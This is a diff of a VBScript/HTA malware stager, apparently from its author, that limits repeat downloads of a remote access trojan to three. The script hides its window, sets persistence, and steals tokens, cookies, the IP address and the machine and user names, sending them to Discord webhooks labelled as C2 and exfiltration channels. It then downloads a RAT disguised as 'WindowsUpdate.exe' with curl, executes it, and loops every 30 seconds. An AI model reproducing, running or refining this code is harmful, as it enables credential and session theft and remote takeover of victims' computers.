@@ -6,17 +6,16 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER
+Dim sh, fso, WH, RE_WH, PC, USER, ratCount
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' C2 WEBHOOK (Commands / Responses)
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-' EXFIL WEBHOOK (Logs / Drops / Re-grab)
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+ratCount = 0
 
 ' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
@@ -26,6 +25,7 @@ Call Persistence
 Call PostCookieOnly(WH)
 
 ' --- 2. DROP RAT LAST (init) ---
+ratCount = ratCount + 1
 Call DropRAT(WH, True)
 
 ' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
@@ -37,7 +37,13 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    Call DropRAT(RE_WH, True)
+    
+    ' Only download RAT if under 3 drops total
+    If ratCount < 3 Then
+        ratCount = ratCount + 1
+        Call DropRAT(RE_WH, True)
+    End If
+    
     Call SleepSeconds(30)
 Loop
 
@@ -45,7 +51,6 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572780865300201522/WindowsUpdate.exe?ex=6aff9dd3&is=6afe4c53&hm=69e17f8d49f71c492d9a30651f54d75e4c63c43dea23110cef0e5435923ceee4&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -56,22 +61,18 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 1. Download file via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
 
-    ' 2. Check file, calculate MB, send Rocket message
     If fso.FileExists(op) Then
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
             
             If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
-
-            ' 3. Execute the file via WMI
+            
             Call RunCmd("""" & op & """")
             
-            ' 4. Send the Green Checkmark
             If sendRocket Then 
                 Call SleepSeconds(2)
                 Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
